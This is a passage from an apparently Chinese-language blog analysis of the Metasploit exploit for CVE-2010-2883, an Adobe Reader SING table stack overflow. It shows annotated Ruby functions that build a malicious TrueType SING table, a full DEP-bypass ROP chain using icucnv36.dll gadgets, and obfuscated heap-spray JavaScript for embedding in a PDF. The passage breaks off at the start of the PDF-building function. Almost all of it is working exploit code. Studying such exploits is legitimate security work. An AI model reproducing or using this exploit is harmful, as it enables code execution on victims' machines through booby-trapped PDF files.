class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_ttf</span></span></span><br><span class="line">    ttf_data = <span class="string">""</span></span><br><span class="line">    <span class="comment"># 加载正常的ttf字体文件</span></span><br><span class="line">    <span class="comment"># <span class="doctag">NOTE:</span> The 0day used Vera.ttf (785d2fd45984c6548763ae6702d83e20)</span></span><br><span class="line">    path = File.join( Msf::Config.data_directory, <span class="string">"exploits"</span>, <span class="string">"cve-2010-2883.ttf"</span> )</span><br><span class="line">    fd = File.open( path, <span class="string">"rb"</span> )</span><br><span class="line">    ttf_data = fd.read(fd.stat.size)</span><br><span class="line">    fd.close</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造SING表</span></span><br><span class="line">    sing = <span class="string">''</span></span><br><span class="line">    sing &lt;&lt; [</span><br><span class="line">        <span class="number">0</span>, <span class="number">1</span>,   <span class="comment"># tableVersionMajor, tableVersionMinor (0.1)</span></span><br><span class="line">        <span class="number">0xe01</span>,  <span class="comment"># glyphletVersion</span></span><br><span class="line">        <span class="number">0x100</span>,  <span class="comment"># embeddingInfo</span></span><br><span class="line">        <span class="number">0</span>,      <span class="comment"># mainGID</span></span><br><span class="line">        <span class="number">0</span>,      <span class="comment"># unitsPerEm</span></span><br><span class="line">        <span class="number">0</span>,      <span class="comment"># vertAdvance</span></span><br><span class="line">        <span class="number">0x3a00</span>  <span class="comment"># vertOrigin</span></span><br><span class="line">    ].pack(<span class="string">'vvvvvvvv'</span>) <span class="comment"># 把两个字符当作little-endian字节顺序的无符号的short。</span></span><br><span class="line">    <span class="comment"># uniqueName</span></span><br><span class="line">    <span class="comment"># "The uniqueName string must be a string of at most 27 7-bit ASCII characters"</span></span><br><span class="line">    <span class="comment">#sing &lt;&lt; "A" * (0x254 - sing.length)</span></span><br><span class="line">    sing &lt;&lt; rand_text(<span class="number">0x254</span> - sing.length) <span class="comment"># 生成随机文本字符,避免漏洞利用中的坏字符</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 0xffffffff gets written here @ 0x7001400 (in BIB.dll)</span></span><br><span class="line">    <span class="comment"># 07001400  f0:ff08  lock dec dword ptr ds:[eax] ; eax=0x4a8a08e2,这句代码将[0x4a8a08e2]变为0xFFFFFFFF</span></span><br><span class="line">    <span class="comment"># 这段代码对eax指向的内存进行了读写,所以eax的值必须是一个可读可写的地址</span></span><br><span class="line">    <span class="comment"># 0x4a8a08e2位于icucnv36的.data段,0x4a8a08e2由this指针(对象(0x0012E608))的值得来(lea eax,dword ptr ds:[ecx+0x1C])</span></span><br><span class="line">    sing[<span class="number">0x140</span>, <span class="number">4</span>] = [<span class="number">0x4a8a08e2</span> - <span class="number">0x1c</span>].pack(<span class="string">'V'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># This becomes our new EIP (puts esp to stack buffer),此ROPgadget使esp指向栈上uniqueName缓冲区内</span></span><br><span class="line">    <span class="comment"># ROP1</span></span><br><span class="line">    ret = <span class="number">0x4a80cb38</span> <span class="comment"># add ebp, 0x794 / leave / ret</span></span><br><span class="line">    sing[<span class="number">0x208</span>, <span class="number">4</span>] = [ret].pack(<span class="string">'V'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># This becomes the new eip after the first return,此ROPgadget使esp变为Heap Spary中的Payload地址,并跳转到Payload执行</span></span><br><span class="line">    <span class="comment"># ROP2</span></span><br><span class="line">    ret = <span class="number">0x4a82a714</span> <span class="comment"># pop esp / ret</span></span><br><span class="line">    sing[<span class="number">0x18</span>, <span class="number">4</span>] = [ret].pack(<span class="string">'V'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># This becomes the new esp after the first return,Heap Spary中的Payload地址,新的esp</span></span><br><span class="line">    esp = <span class="number">0x0c0c0c0c</span></span><br><span class="line">    sing[<span class="number">0x1c</span>, <span class="number">4</span>] = [esp].pack(<span class="string">'V'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Without the following, sub_801ba57 returns 0.</span></span><br><span class="line">    sing[<span class="number">0x24c</span>, <span class="number">4</span>] = [<span class="number">0x6c</span>].pack(<span class="string">'V'</span>)</span><br><span class="line"></span><br><span class="line">    ttf_data[<span class="number">0xec</span>, <span class="number">4</span>] = <span class="string">"SING"</span></span><br><span class="line">    ttf_data[<span class="number">0x11c</span>, sing.length] = sing</span><br><span class="line"></span><br><span class="line">    ttf_data</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h4 id="3、make-js"><a href="#3、make-js" class="headerlink" title="3、make_js()"></a>3、make_js()</h4><p>&emsp;&emsp;此函数的功能将j<code>avascript的代码</code>转换为<code>字符串</code>,并将javascript的<code>变量名</code>进行<code>混淆</code>。javascript的代码用于<code>堆喷</code>,所以我们应将用于将<code>真正的shellcode</code>复制到<code>可读可写可执行</code>内存段的<code>ROP Chain</code>以及<code>经过编码的Payload</code>编入其中。将<code>真正的shellcode</code>复制到<code>可读可写可执行</code>内存段的<code>ROP Chain</code>的细节前面讲过了,就不说了。其他<code>关键部分</code>都做了注释,<code>函数功能</code>如下：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_js</span><span class="params">(encoded_payload)</span></span></span><br><span class="line">    <span class="comment"># 使用icucnv36.dll中的代码片段,构建ret2lib的ROP Chain.以此绕过DEP,执行shellcode.</span></span><br><span class="line">    stack_data = [</span><br><span class="line">        <span class="number">0x41414141</span>,   <span class="comment"># unused</span></span><br><span class="line">        <span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">        <span class="number">0x4a8a0000</span>,   <span class="comment"># becomes ecx</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a802196</span>,   <span class="comment"># mov [ecx],eax / ret # save whatever eax starts as</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a801f90</span>,   <span class="comment"># pop eax / ret</span></span><br><span class="line">        <span class="number">0x4a84903c</span>,   <span class="comment"># becomes eax (import for CreateFileA)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># -- call CreateFileA</span></span><br><span class="line">        <span class="number">0x4a80b692</span>,   <span class="comment"># jmp [eax]</span></span><br><span class="line">        <span class="number">0x4a801064</span>,   <span class="comment"># ret</span></span><br><span class="line">        <span class="number">0x4a8522c8</span>,   <span class="comment"># first arg to CreateFileA (lpFileName / pointer to "iso88591")</span></span><br><span class="line">        <span class="number">0x10000000</span>,   <span class="comment"># second arg  - dwDesiredAccess</span></span><br><span class="line">        <span class="number">0x00000000</span>,   <span class="comment"># third arg   - dwShareMode</span></span><br><span class="line">        <span class="number">0x00000000</span>,   <span class="comment"># fourth arg  - lpSecurityAttributes</span></span><br><span class="line">        <span class="number">0x00000002</span>,   <span class="comment"># fifth arg   - dwCreationDisposition</span></span><br><span class="line">        <span class="number">0x00000102</span>,   <span class="comment"># sixth arg   - dwFlagsAndAttributes</span></span><br><span class="line">        <span class="number">0x00000000</span>,   <span class="comment"># seventh arg - hTemplateFile</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">        <span class="number">0x4a801064</span>,   <span class="comment"># becomes ecx</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a842db2</span>,   <span class="comment"># xchg eax,edi / ret</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a802ab1</span>,   <span class="comment"># pop ebx / ret</span></span><br><span class="line">        <span class="number">0x00000008</span>,   <span class="comment"># becomes ebx - offset to modify</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># This points at a neat-o block of code that ... TBD</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment">#   and [esp+ebx*2],edi</span></span><br><span class="line">        <span class="comment">#   jne check_slash</span></span><br><span class="line">        <span class="comment"># ret_one:</span></span><br><span class="line">        <span class="comment">#   mov al,1</span></span><br><span class="line">        <span class="comment">#   ret</span></span><br><span class="line">        <span class="comment"># check_slash:</span></span><br><span class="line">        <span class="comment">#   cmp al,0x2f</span></span><br><span class="line">        <span class="comment">#   je ret_one</span></span><br><span class="line">        <span class="comment">#   cmp al,0x41</span></span><br><span class="line">        <span class="comment">#   jl check_lower</span></span><br><span class="line">        <span class="comment">#   cmp al,0x5a</span></span><br><span class="line">        <span class="comment">#   jle check_ptr</span></span><br><span class="line">        <span class="comment"># check_lower:</span></span><br><span class="line">        <span class="comment">#   cmp al,0x61</span></span><br><span class="line">        <span class="comment">#   jl ret_zero</span></span><br><span class="line">        <span class="comment">#   cmp al,0x7a</span></span><br><span class="line">        <span class="comment">#   jg ret_zero</span></span><br><span class="line">        <span class="comment">#   cmp [ecx+1],0x3a</span></span><br><span class="line">        <span class="comment">#   je ret_one</span></span><br><span class="line">        <span class="comment"># ret_zero:</span></span><br><span class="line">        <span class="comment">#   xor al,al</span></span><br><span class="line">        <span class="comment">#   ret</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="number">0x4a80a8a6</span>,   <span class="comment"># execute fun block</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a801f90</span>,   <span class="comment"># pop eax / ret</span></span><br><span class="line">        <span class="number">0x4a849038</span>,   <span class="comment"># becomes eax (import for CreateFileMappingA)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># -- call CreateFileMappingA</span></span><br><span class="line">        <span class="number">0x4a80b692</span>,   <span class="comment"># jmp [eax]</span></span><br><span class="line">        <span class="number">0x4a801064</span>,   <span class="comment"># ret</span></span><br><span class="line">        <span class="number">0xffffffff</span>,   <span class="comment"># arguments to CreateFileMappingA, hFile</span></span><br><span class="line">        <span class="number">0x00000000</span>,   <span class="comment"># lpAttributes</span></span><br><span class="line">        <span class="number">0x00000040</span>,   <span class="comment"># flProtect</span></span><br><span class="line">        <span class="number">0x00000000</span>,   <span class="comment"># dwMaximumSizeHigh</span></span><br><span class="line">        <span class="number">0x00010000</span>,   <span class="comment"># dwMaximumSizeLow</span></span><br><span class="line">        <span class="number">0x00000000</span>,   <span class="comment"># lpName</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">        <span class="number">0x4a801064</span>,   <span class="comment"># becomes ecx</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a842db2</span>,   <span class="comment"># xchg eax,edi / ret</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a802ab1</span>,   <span class="comment"># pop ebx / ret</span></span><br><span class="line">        <span class="number">0x00000008</span>,   <span class="comment"># becomes ebx - offset to modify</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a80a8a6</span>,   <span class="comment"># execute fun block</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a801f90</span>,   <span class="comment"># pop eax / ret</span></span><br><span class="line">        <span class="number">0x4a849030</span>,   <span class="comment"># becomes eax (import for MapViewOfFile</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># -- call MapViewOfFile</span></span><br><span class="line">        <span class="number">0x4a80b692</span>,   <span class="comment"># jmp [eax]</span></span><br><span class="line">        <span class="number">0x4a801064</span>,   <span class="comment"># ret</span></span><br><span class="line">        <span class="number">0xffffffff</span>,   <span class="comment"># args to MapViewOfFile - hFileMappingObject</span></span><br><span class="line">        <span class="number">0x00000022</span>,   <span class="comment"># dwDesiredAccess</span></span><br><span class="line">        <span class="number">0x00000000</span>,   <span class="comment"># dwFileOffsetHigh</span></span><br><span class="line">        <span class="number">0x00000000</span>,   <span class="comment"># dwFileOffsetLow</span></span><br><span class="line">        <span class="number">0x00010000</span>,   <span class="comment"># dwNumberOfBytesToMap</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">        <span class="number">0x4a8a0004</span>,   <span class="comment"># becomes ecx - writable pointer</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a802196</span>,   <span class="comment"># mov [ecx],eax / ret - save map base addr</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">        <span class="number">0x4a801064</span>,   <span class="comment"># becomes ecx - ptr to ret</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a842db2</span>,   <span class="comment"># xchg eax,edi / ret</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a802ab1</span>,   <span class="comment"># pop ebx / ret</span></span><br><span class="line">        <span class="number">0x00000030</span>,   <span class="comment"># becomes ebx - offset to modify</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a80a8a6</span>,   <span class="comment"># execute fun block</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a801f90</span>,   <span class="comment"># pop eax / ret</span></span><br><span class="line">        <span class="number">0x4a8a0004</span>,   <span class="comment"># becomes eax - saved file mapping ptr</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a80a7d8</span>,   <span class="comment"># mov eax,[eax] / ret - load saved mapping ptr</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">        <span class="number">0x4a801064</span>,   <span class="comment"># becomes ecx - ptr to ret</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a842db2</span>,   <span class="comment"># xchg eax,edi / ret</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a802ab1</span>,   <span class="comment"># pop ebx / ret</span></span><br><span class="line">        <span class="number">0x00000020</span>,   <span class="comment"># becomes ebx - offset to modify</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a80a8a6</span>,   <span class="comment"># execute fun block</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">        <span class="number">0x4a801064</span>,   <span class="comment"># becomes ecx - ptr to ret</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a80aedc</span>,   <span class="comment"># lea edx,[esp+0xc] / push edx / push eax / push [esp+0xc] / push [0x4a8a093c] / call ecx / add esp, 0x10 / ret</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a801f90</span>,   <span class="comment"># pop eax / ret</span></span><br><span class="line">        <span class="number">0x00000034</span>,   <span class="comment"># becomes eax</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a80d585</span>,   <span class="comment"># add eax,edx / ret</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">        <span class="number">0x4a801064</span>,   <span class="comment"># becomes ecx - ptr to ret</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a842db2</span>,   <span class="comment"># xchg eax,edi / ret</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a802ab1</span>,   <span class="comment"># pop ebx / ret</span></span><br><span class="line">        <span class="number">0x0000000a</span>,   <span class="comment"># becomes ebx - offset to modify</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a80a8a6</span>,   <span class="comment"># execute fun block</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a801f90</span>,   <span class="comment"># pop eax / ret</span></span><br><span class="line">        <span class="number">0x4a849170</span>,   <span class="comment"># becomes eax (import for memcpy)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># -- call memcpy</span></span><br><span class="line">        <span class="number">0x4a80b692</span>,   <span class="comment"># jmp [eax]</span></span><br><span class="line">        <span class="number">0xffffffff</span>,   <span class="comment"># this stuff gets overwritten by the block at 0x4a80aedc, becomes ret from memcpy</span></span><br><span class="line">        <span class="number">0xffffffff</span>,   <span class="comment"># becomes first arg to memcpy (dst)</span></span><br><span class="line">        <span class="number">0xffffffff</span>,   <span class="comment"># becomes second arg to memcpy (src)</span></span><br><span class="line">        <span class="number">0x00001000</span>,   <span class="comment"># becomes third arg to memcpy (length)</span></span><br><span class="line">    ].pack(<span class="string">'V*'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 用于混淆js的变量名</span></span><br><span class="line">    var_unescape  = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>) <span class="comment"># rand_text_alpha()用于生成随机的字符串，同时避免生成漏洞利用中的坏字符。</span></span><br><span class="line">    var_shellcode = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line">    var_start     = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line">    var_s         = <span class="number">0x10000</span></span><br><span class="line">    var_c         = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line">    var_b         = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line">    var_d         = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line">    var_3         = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line">    var_i         = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line">    var_4         = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    payload_buf = <span class="string">''</span></span><br><span class="line">    payload_buf &lt;&lt; stack_data           <span class="comment"># 将真正的shellcode复制到可读可写可执行内存段的ROP Chain。</span></span><br><span class="line">    payload_buf &lt;&lt; encoded_payload      <span class="comment"># 经过编码的shellcode放在ROP Chain的后面</span></span><br><span class="line"></span><br><span class="line">    escaped_payload = Rex::Text.to_unescape(payload_buf) <span class="comment"># 返回用于Javascript的unicode转义字符串</span></span><br><span class="line"></span><br><span class="line">    js = <span class="string">%Q|</span></span><br><span class="line"><span class="string">var <span class="subst">#&#123;var_unescape&#125;</span> = unescape;</span></span><br><span class="line"><span class="string">var <span class="subst">#&#123;var_shellcode&#125;</span> = <span class="subst">#&#123;var_unescape&#125;</span>( '<span class="subst">#&#123;escaped_payload&#125;</span>' );</span></span><br><span class="line"><span class="string">var <span class="subst">#&#123;var_c&#125;</span> = <span class="subst">#&#123;var_unescape&#125;</span>( "%" + "u" + "0" + "c" + "0" + "c" + "%u" + "0" + "c" + "0" + "c" );</span></span><br><span class="line"><span class="string">while (<span class="subst">#&#123;var_c&#125;</span>.length + 20 + 8 &lt; <span class="subst">#&#123;var_s&#125;</span>) <span class="subst">#&#123;var_c&#125;</span>+=<span class="subst">#&#123;var_c&#125;</span>;</span></span><br><span class="line"><span class="string"><span class="subst">#&#123;var_b&#125;</span> = <span class="subst">#&#123;var_c&#125;</span>.substring(0, (0x0c0c-0x24)/2);</span></span><br><span class="line"><span class="string"><span class="subst">#&#123;var_b&#125;</span> += <span class="subst">#&#123;var_shellcode&#125;</span>;</span></span><br><span class="line"><span class="string"><span class="subst">#&#123;var_b&#125;</span> += <span class="subst">#&#123;var_c&#125;</span>;</span></span><br><span class="line"><span class="string"><span class="subst">#&#123;var_d&#125;</span> = <span class="subst">#&#123;var_b&#125;</span>.substring(0, <span class="subst">#&#123;var_s&#125;</span>/2);</span></span><br><span class="line"><span class="string">while(<span class="subst">#&#123;var_d&#125;</span>.length &lt; 0x80000) <span class="subst">#&#123;var_d&#125;</span> += <span class="subst">#&#123;var_d&#125;</span>;</span></span><br><span class="line"><span class="string"><span class="subst">#&#123;var_3&#125;</span> = <span class="subst">#&#123;var_d&#125;</span>.substring(0, 0x80000 - (0x1020-0x08) / 2);</span></span><br><span class="line"><span class="string">var <span class="subst">#&#123;var_4&#125;</span> = new Array();</span></span><br><span class="line"><span class="string">for (<span class="subst">#&#123;var_i&#125;</span>=0;<span class="subst">#&#123;var_i&#125;</span>&lt;0x1f0;<span class="subst">#&#123;var_i&#125;</span>++) <span class="subst">#&#123;var_4&#125;</span>[<span class="subst">#&#123;var_i&#125;</span>]=<span class="subst">#&#123;var_3&#125;</span>+"s";</span></span><br><span class="line"><span class="string">|</span></span><br><span class="line"></span><br><span class="line">    js</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h4 id="4、make-pdf"><a href="#4、make-pdf" class="headerlink" title="4、make_pdf()"></a>4、make_pdf()</h4><p>&emsp;&emsp;此函数一步一步构造<code>pdf</code>中的每一个<code>obj</code>,将<code>ttf字体数据</code>和<code>javascript代码</code>分别放在了<code>obj10</code>和<code>obj12</code>,然后在<code>obj1</code>中设置<code>/OpenAction 11 0 R</code>,使pdf文件<code>打开</code>时,<code>javascript</code>能够被执行,从而实现<code>Heap Spary</code>。还构造了<code>obj13</code>,使<code>icucnv36.dll</code>能够被加载。因为,<code>exp</code>中使用的<code>ROPgadget</code>都是出自<code>icucnv36.dll</code>模块的,所以其必须要<code>被加载到内存</code>中。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_pdf</span><span class="params">(ttf, js)</span></span></span><br><span class="line">    xref = []</span><br><span class="line">    eol = <span class="string">"\n"</span> <span class="comment"># end of line</span></span><br><span class="line">    endobj = <span class="string">"endobj"</span> &lt;&lt; eol</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Randomize PDF version?</span></span><br><span class="line">    pdf = <span class="string">"%PDF-1.5"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; <span class="string">"%"</span> &lt;&lt; random_non_ascii_string(<span class="number">4</span>) &lt;&lt; eol     <span class="comment"># 